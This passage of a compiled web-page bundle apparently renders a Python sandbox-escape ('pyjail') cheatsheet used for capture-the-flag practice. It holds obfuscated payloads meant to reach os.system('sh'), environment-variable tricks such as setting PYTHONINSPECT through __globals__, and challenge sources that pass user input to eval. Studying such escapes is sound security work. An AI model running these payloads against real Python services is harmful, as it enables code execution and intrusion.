class="token punctuation">,</span>qE<span class="token punctuation">,</span>rE<span class="token punctuation">,</span>sE<span class="token punctuation">,</span>tE<span class="token punctuation">,</span>uE<span class="token punctuation">,</span>vE<span class="token punctuation">,</span>wE<span class="token punctuation">,</span>xE<span class="token punctuation">,</span>yE<span class="token punctuation">,</span>zE<span class="token punctuation">,</span>aF<span class="token punctuation">,</span>bF<span class="token punctuation">,</span>cF<span class="token punctuation">,</span>dF<span class="token punctuation">,</span>eF<span class="token punctuation">,</span>fF<span class="token punctuation">,</span>gF<span class="token punctuation">,</span>hF<span class="token punctuation">,</span>iF<span class="token punctuation">,</span>jF<span class="token punctuation">,</span>kF<span class="token punctuation">,</span>lF<span class="token punctuation">,</span>mF<span class="token punctuation">,</span>nF<span class="token punctuation">,</span>oF<span class="token punctuation">,</span>pF<span class="token punctuation">,</span>qF<span class="token punctuation">,</span>rF<span class="token punctuation">,</span>sF<span class="token punctuation">,</span>tF<span class="token punctuation">,</span>uF<span class="token punctuation">,</span>vF<span class="token punctuation">,</span>wF<span class="token punctuation">,</span>xF<span class="token punctuation">,</span>yF<span class="token punctuation">,</span>zF<span class="token punctuation">,</span>aG <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>__dict__<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @st4rn - os.system("sh")</span>
<span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">,</span> re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>S<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">bytearray</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token punctuation">:</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>S<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">,</span> re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">bytearray</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token punctuation">:</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code>`,Be,fs,Ma,Lu,Me,bs,Cp,Ap,Cu,qe,ys,_f=`<code class="language-py"><span class="token comment"># @Satoooon - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&amp;type=code</span>
<span class="token keyword">import</span><span class="token punctuation">:</span> ctypes<span class="token punctuation">.</span>_aix
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>exec_module<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"ctypes._aix"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"PYTHONINSPECT"</span><span class="token punctuation">]</span>
value<span class="token punctuation">:</span> <span class="token string">"1"</span>

<span class="token comment"># @maple3142</span>
<span class="token keyword">import</span><span class="token punctuation">:</span> main
<span class="token keyword">import</span><span class="token punctuation">:</span> os
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"help"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>DISALLOWED_WORDS
value<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"help"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"PYTHONINSPECT"</span><span class="token punctuation">]</span>
value<span class="token punctuation">:</span> <span class="token string">"1"</span></code>`,Ne,ms,qa,Au,Se,vs,Tp,Fp,Tu,ze,ws,df='<code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code> "</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>',Ye,gs,Dp,Ip,Fu,We,Es,ff='<code class="language-py"><span class="token comment"># TBA</span></code>',Ve,hs,Na,Du,Ge,xs,Hp,Op,Iu,$e,Ls,bf=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code> "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">72</span><span class="token punctuation">]</span>
<span class="token keyword">if</span> <span class="token string">"__"</span> <span class="token keyword">in</span> inp<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nope"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,Xe,Cs,Rp,jp,Hu,Ke,As,yf='<code class="language-py"><span class="token comment"># TBA</span></code>',Ze,Ts,Sa,Ou,Je,Fs,Up,Pp,Ru,Qe,Ds,mf=`<code class="language-py"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[a-z0-9]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">130</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,nc,Is,Bp,Mp,ju,sc,Hs,vf='<code class="language-py"><span class="token comment"># TBA</span></code>',ac,Os,za,Uu,tc,Rs,qp,Np,Pu,pc,js,wf=`<code class="language-py"><span class="token keyword">import</span> re
FLAG <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'd'</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1337</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span></code>`,oc,Us,Sp,zp,Bu,ec,Ps,gf='<code class="language-py"><span class="token comment"># TBA</span></code>',cc,Bs,Ya,Mu,lc,Ms,Yp,Wp,qu,uc,qs,Ef=`<code class="language-py"><span class="token keyword">import</span> re
FLAG <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'[123456789]'</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'('</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1337</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span></code>`,ic,Ns,Vp,Gp,Nu,kc,Ss,hf='<code class="language-py"><span class="token comment"># TBA</span></code>',rc,zs,Wa,Su,_c,Ys,$p,Xp,zu,dc,Ws,xf=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[a-m]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>inp<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,fc,Vs,Kp,Zp,Yu,bc,Gs,Lf='<code class="language-py"><span class="token comment"># TBA</span></code>',yc,$s,Va,Wu,mc,Xs,Jp,Qp,Vu,vc,Ks,Cf=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[n-z]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>inp<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,wc,Zs,no,so,Gu,gc,Js,Af='<code class="language-py"><span class="token comment"># TBA</span></code>',Ec,Qs,Ga,$u,hc,w,ao,I,Xu,Ku,to,H,Zu,Ju,po,O,Qu;return{c(){d=t("blockquote"),v=t("p"),x=k("Notice: This document will be continuously updated."),R=u(),_=t("h2"),y=t("a"),sa=k("Sinks"),eo=u(),M=t("h3"),aa=t("a"),Dc=k("retrieving builtins"),co=u(),q=t("pre"),lo=u(),N=t("h3"),ta=t("a"),Ic=k("good to know built-in functions and methods"),uo=u(),S=t("pre"),io=u(),z=t("h3"),pa=t("a"),Hc=k("subclasses"),ko=u(),Y=t("pre"),ro=u(),W=t("h3"),oa=t("a"),Oc=k("popular modules"),_o=u(),V=t("pre"),fo=u(),G=t("h2"),ea=t("a"),Rc=k("Bypasses and payloads"),bo=u(),$=t("h3"),ca=t("a"),jc=k("decorators"),yo=u(),X=t("pre"),mo=u(),K=t("h3"),la=t("a"),Uc=k("unicode bypass"),vo=u(),Z=t("pre"),wo=u(),J=t("h3"),ua=t("a"),Pc=k("assigning attributes and variables"),go=u(),Q=t("pre"),Eo=u(),nn=t("pre"),ho=u(),sn=t("h3"),ia=t("a"),Bc=k("getting attributes without dot"),xo=u(),an=t("pre"),Lo=u(),tn=t("pre"),Co=u(),pn=t("h3"),ka=t("a"),Mc=k("getting attributes without underscore"),Ao=u(),on=t("pre"),To=u(),en=t("h3"),ra=t("a"),qc=k("running functions and methods without parenthesis"),Fo=u(),cn=t("pre"),Do=u(),ln=t("pre"),Io=u(),un=t("h3"),_a=t("a"),Nc=k("deleting variables"),Ho=u(),kn=t("pre"),Oo=u(),rn=t("h2"),da=t("a"),Sc=k("General stuff"),Ro=u(),_n=t("h3"),fa=t("a"),zc=k("environment variables"),jo=u(),L=t("ul"),Za=t("li"),C=t("a"),Yc=k("https://www.elttam.com/blog/env/#python"),Wc=u(),m=t("li"),Ja=t("code"),Vc=k("PYTHONINSPECT"),Gc=k(", "),Qa=t("code"),$c=k("PYTHONHOME"),Xc=k(", "),nt=t("code"),Kc=k("PYTHONPATH"),Zc=k(", "),st=t("code"),Jc=k("PYTHONWARNINGS"),Qc=k(", "),at=t("code"),nl=k("BROWSER"),Uo=u(),dn=t("h3"),ba=t("a"),sl=k("magic methods"),Po=u(),fn=t("ul"),tt=t("li"),A=t("a"),al=k("https://rszalski.github.io/magicmethods/#appendix1"),Bo=u(),bn=t("h3"),ya=t("a"),tl=k("stable payloads"),Mo=u(),yn=t("pre"),qo=u(),mn=t("h3"),ma=t("a"),pl=k("finding sinks from modules"),No=u(),T=t("ul"),pt=t("li"),F=t("a"),ol=k("https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),el=u(),ot=t("li"),D=t("a"),cl=k("https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),So=u(),vn=t("h3"),va=t("a"),ll=k("bullet points"),zo=u(),f=t("ul"),j=t("li"),et=t("code"),ul=k('f"{65:c}"'),il=k(" can format an int to char (equalivant to "),ct=t("code"),kl=k('"%c" % 65 == chr(65) == "A"'),rl=k(")"),_l=u(),wa=t("li"),lt=t("code"),dl=k('"".encode().fromhex("41").decode()'),fl=k(" parses hex into string"),bl=u(),ga=t("li"),ut=t("code"),yl=k("type"),U=t("ul"),it=t("li"),kt=t("code"),ml=k("[].__class__.__class__"),vl=u(),rt=t("li"),_t=t("code"),wl=k('"".__class__.__class__'),gl=u(),Ea=t("li"),dt=t("code"),El=k("object"),g=t("ul"),ft=t("li"),bt=t("code"),hl=k("[].__class__.__mro__[1]"),xl=u(),yt=t("li"),mt=t("code"),Ll=k("[].__class__.__bases__[0]"),Cl=u(),vt=t("li"),wt=t("code"),Al=k("[].__class__.__base__"),Tl=u(),ha=t("li"),gt=t("code"),Fl=k("str"),E=t("ul"),Et=t("li"),ht=t("code"),Dl=k('"".__class__'),Il=u(),xt=t("li"),Lt=t("code"),Hl=k("[].__doc__.__class__"),Ol=u(),Ct=t("li"),At=t("code"),Rl=k("[].__class__.__module__.__class__"),jl=u(),xa=t("li"),Tt=t("code"),Ul=k("tuple"),La=t("ul"),Ft=t("li"),Dt=t("code"),Pl=k("[].__class__.__bases__.__class__"),Bl=u(),Ca=t("li"),It=t("code"),Ml=k("dict"),P=t("ul"),Ht=t("li"),Ot=t("code"),ql=k("{}.__class__"),Nl=u(),Rt=t("li"),jt=t("code"),Sl=k("obj.__dict__.__class__"),zl=u(),wn=t("li"),Ut=t("code"),Yl=k("class instances"),Wl=k(":"),B=t("ul"),Aa=t("li"),Pt=t("code"),Vl=k("class cobj:..."),Ta=t("ul"),Bt=t("li"),Mt=t("code"),Gl=k("obj = cobj()"),$l=u(),qt=t("li"),Nt=t("code"),Xl=k('type("cobj", (object,), {})()'),Yo=u(),gn=t("h2"),Fa=t("a"),Kl=k("CTF"),Wo=u(),En=t("h3"),Da=t("a"),Zl=k("vsCTF 2024: llama-jail-revenge"),Vo=u(),hn=t("ul"),St=t("li"),zt=t("code"),Jl=k("chall.py"),Go=u(),xn=t("pre"),$o=u(),Ln=t("ul"),Yt=t("li"),Wt=t("code"),Ql=k("exec_utils.py"),Xo=u(),Cn=t("pre"),Ko=u(),An=t("ul"),Vt=t("li"),Gt=t("code"),nu=k("solve.py"),Zo=u(),Tn=t("pre"),Jo=u(),Fn=t("h3"),Ia=t("a"),su=k("GlacierCTF 2023: Avatar"),Qo=u(),Dn=t("ul"),$t=t("li"),Xt=t("code"),au=k("server.py"),ne=u(),In=t("pre"),se=u(),Hn=t("ul"),Kt=t("li"),Zt=t("code"),tu=k("solve.py"),ae=u(),On=t("pre"),te=u(),Rn=t("h3"),Ha=t("a"),pu=k("TFC CTF 2023: My Third Calculator"),pe=u(),jn=t("ul"),Jt=t("li"),Qt=t("code"),ou=k("server.py"),oe=u(),Un=t("pre"),ee=u(),Pn=t("ul"),np=t("li"),sp=t("code"),eu=k("solve.py"),ce=u(),Bn=t("pre"),le=u(),Mn=t("h3"),Oa=t("a"),cu=k("Equinor CTF 2023: Dis is it!"),ue=u(),qn=t("ul"),ap=t("li"),tp=t("code"),lu=k("main.py"),ie=u(),Nn=t("pre"),ke=u(),Sn=t("ul"),pp=t("li"),op=t("code"),uu=k("solve.py"),re=u(),zn=t("pre"),_e=u(),Yn=t("h3"),Ra=t("a"),iu=k("37C3 Potluck CTF: tacocat"),de=u(),Wn=t("ul"),ep=t("li"),cp=t("code"),ku=k("main.py"),fe=u(),Vn=t("pre"),be=u(),Gn=t("ul"),lp=t("li"),up=t("code"),ru=k("solve.py"),ye=u(),$n=t("pre"),me=u(),Xn=t("h3"),ja=t("a"),_u=k("Internet Festival 2023 CTF Finals: prison"),ve=u(),Kn=t("ul"),ip=t("li"),kp=t("code"),du=k("prison.py"),we=u(),Zn=t("pre"),ge=u(),Jn=t("ul"),rp=t("li"),_p=t("code"),fu=k("solve.py"),Ee=u(),Qn=t("pre"),he=u(),ns=t("h3"),Ua=t("a"),bu=k("WACON 2023 Prequal: ScavengerHunt"),xe=u(),ss=t("ul"),dp=t("li"),fp=t("code"),yu=k("prob.py"),Le=u(),as=t("pre"),Ce=u(),ts=t("ul"),bp=t("li"),yp=t("code"),mu=k("secret.py"),Ae=u(),ps=t("pre"),Te=u(),os=t("ul"),mp=t("li"),vp=t("code"),vu=k("solve.py"),Fe=u(),es=t("pre"),De=u(),cs=t("h3"),Pa=t("a"),wu=k("CrewCTF 2023: starship-1"),Ie=u(),ls=t("ul"),wp=t("li"),gp=t("code"),gu=k("sandbox.py"),He=u(),us=t("pre"),Oe=u(),is=t("ul"),Ep=t("li"),hp=t("code"),Eu=k("solve.py"),Re=u(),ks=t("pre"),je=u(),rs=t("h3"),Ba=t("a"),hu=k("CrewCTF 2023: starship"),Ue=u(),_s=t("ul"),xp=t("li"),Lp=t("code"),xu=k("solve.py"),Pe=u(),ds=t("pre"),Be=u(),fs=t("h3"),Ma=t("a"),Lu=k("CrewCTF 2023: setjail"),Me=u(),bs=t("ul"),Cp=t("li"),Ap=t("code"),Cu=k("solve.py"),qe=u(),ys=t("pre"),Ne=u(),ms=t("h3"),qa=t("a"),Au=k("BYUCTF 2023: Builtins 1"),Se=u(),vs=t("ul"),Tp=t("li"),Fp=t("code"),Tu=k("b1.py"),ze=u(),ws=t("pre"),Ye=u(),gs=t("ul"),Dp=t("li"),Ip=t("code"),Fu=k("solve.py"),We=u(),Es=t("pre"),Ve=u(),hs=t("h3"),Na=t("a"),Du=k("BYUCTF 2023: Builtins 2"),Ge=u(),xs=t("ul"),Hp=t("li"),Op=t("code"),Iu=k("b2.py"),$e=u(),Ls=t("pre"),Xe=u(),Cs=t("ul"),Rp=t("li"),jp=t("code"),Hu=k("solve.py"),Ke=u(),As=t("pre"),Ze=u(),Ts=t("h3"),Sa=t("a"),Ou=k("BYUCTF 2023: a-z0-9"),Je=u(),Fs=t("ul"),Up=t("li"),Pp=t("code"),Ru=k("a-z0-9.py"),Qe=u(),Ds=t("pre"),nc=u(),Is=t("ul"),Bp=t("li"),Mp=t("code"),ju=k("solve.py"),sc=u(),Hs=t("pre"),ac=u(),Os=t("h3"),za=t("a"),Uu=k("BYUCTF 2023: Leet 1"),tc=u(),Rs=t("ul"),qp=t("li"),Np=t("code"),Pu=k("leet1.py"),pc=u(),js=t("pre"),oc=u(),Us=t("ul"),Sp=t("li"),zp=t("code"),Bu=k("solve.py"),ec=u(),Ps=t("pre"),cc=u(),Bs=t("h3"),Ya=t("a"),Mu=k("BYUCTF 2023: Leet 2"),lc=u(),Ms=t("ul"),Yp=t("li"),Wp=t("code"),qu=k("leet2.py"),uc=u(),qs=t("pre"),ic=u(),Ns=t("ul"),Vp=t("li"),Gp=t("code"),Nu=k("solve.py"),kc=u(),Ss=t("pre"),rc=u(),zs=t("h3"),Wa=t("a"),Su=k("BYUCTF 2023: abcdefghijklm"),_c=u(),Ys=t("ul"),$p=t("li"),Xp=t("code"),zu=k("abcdefghijklm.py"),dc=u(),Ws=t("pre"),fc=u(),Vs=t("ul"),Kp=t("li"),Zp=t("code"),Yu=k("solve.py"),bc=u(),Gs=t("pre"),yc=u(),$s=t("h3"),Va=t("a"),Wu=k("BYUCTF 2023: nopqrstuvwxyz"),mc=u(),Xs=t("ul"),Jp=t("li"),Qp=t("code"),Vu=k("nopqrstuvwxyz.py"),vc=u(),Ks=t("pre"),wc=u(),Zs=t("ul"),no=t("li"),so=t("code"),Gu=k("solve.py"),gc=u(),Js=t("pre"),Ec=u(),Qs=t("h2"),Ga=t("a"),$u=k("References"),hc=u(),w=t("ul"),ao=t("li"),I=t("a"),Xu=k("https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),Ku=u(),to=t("li"),H=t("a"),Zu=k("https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),Ju=u(),po=t("li"),O=t("a"),Qu=k("https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),this.h()},l(n){d=p(n,"BLOCKQUOTE",{});var e=o(d);v=p(e,"P",{});var li=o(v);x=r(li,"Notice: This document will be continuously updated."),li.forEach(s),e.forEach(s),R=i(n),_=p(n,"H2",{id:!0});var ui=o(_);y=p(ui,"A",{href:!0});var ii=o(y);sa=r(ii,"Sinks"),ii.forEach(s),ui.forEach(s),eo=i(n),M=p(n,"H3",{id:!0});var 